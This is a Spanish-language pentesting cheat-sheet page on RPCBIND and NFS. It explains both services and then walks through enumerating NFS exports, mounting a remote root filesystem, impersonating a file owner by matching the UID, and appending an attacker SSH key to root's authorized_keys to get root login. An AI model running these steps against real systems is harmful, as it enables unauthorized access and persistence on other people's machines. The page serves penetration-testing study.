---
description: >-
  Explotar los servicios RPCBIND y NFS en conjunto para obtener acceso a
  archivos compartidos.
---

# 111, 2049 - RPCBIND Y NFS

## ¿**QUE ES NFS?**

Network File System o NFS por sus siglas en inglés, es un protocolo para un sistema de archivos distribuido, el cual permite a un usuario en una computadora cliente el acceso hacia archivos a través de la red como si accediera a un almacenamiento local.

**Puerto por defecto: 2049**

## **¿QUE ES RPCBIND?**

&#x20;   RPC o Remote Procedure Call es una técnica para construir sistema distribuidos, y aplicaciones cliente / servidor. Básicamente permite a un programa sobre una máquina llamar a una subrutina sobre otra máquina. RPC no es un protocolo de transporte; en lugar de ello, es un método para utilizar características existentes de una comunicación de una manera transparente. En servidores Unix o similares se debe ser conscientes de la aplicaciones que utilizan RPC.

**Puerto por defecto: 111**

## **PoC**

**`rpcinfo -p ip`**\
La opción “-p” evalúa al portmapper del host, e imprime una lista de todos los programas RPC registrados.

**`showmount -e ip`**\
Se utiliza el comando “showmount” para mostrar información de montaje sobre un servidor NFS. La opción “-e” muestra la lista de exportación del servidor NFS.

Si la“/” raíz del sistema de archivos del objetivo de evaluación está siendo exportado, entonces es factible montar localmente este sistema de archivos. Con el comando "mount" se utiliza la opción “-t” para indicar el tipo del sistema de archivos a montar. La opción “-o” define otras opciones, para este presente ejemplo el uso de la opción “nolock” permite a las aplicaciones bloquear archivos, pero tales bloqueos proporcionan exclusión únicamente contra otras aplicaciones ejecutándose en el mismo cliente

**`mount -t nfs 192.168.0.X:/ FSremoto/ -o nolock`**

La version 4 de nfs tiene un sistema de seguridad que impide ver desde otro host el uid del usuario propietario. En ocasiones se pueden utilizar varias versiones de nfs, para usar una anterior utilizamos -o vers=2.

**`mount -t nfs -o vers=2 ip:ruta`**

Al saber el uid del usuario propietario, si creamos uno con el mismo uid podemos entrar en la carpeta compartida sin problemas.

Una vez en esta carpeta compartida y si el host tiene el puerto 22 abierto (ssh) podemos generar un par de claves rsa (sabemos cuales acepta en el nmap) con ssh-keygen y despues incluimos la clave publica en el archivo ./.ssh/authorized\_keys

**`ssh-keygen`**

**`cat /tmp/id_rsa.pub >> FSremoto/root/.ssh/authorized_keys`**

**`ssh -i /tmp/id_rsa root@192.168.0.X ssh user@ip`**
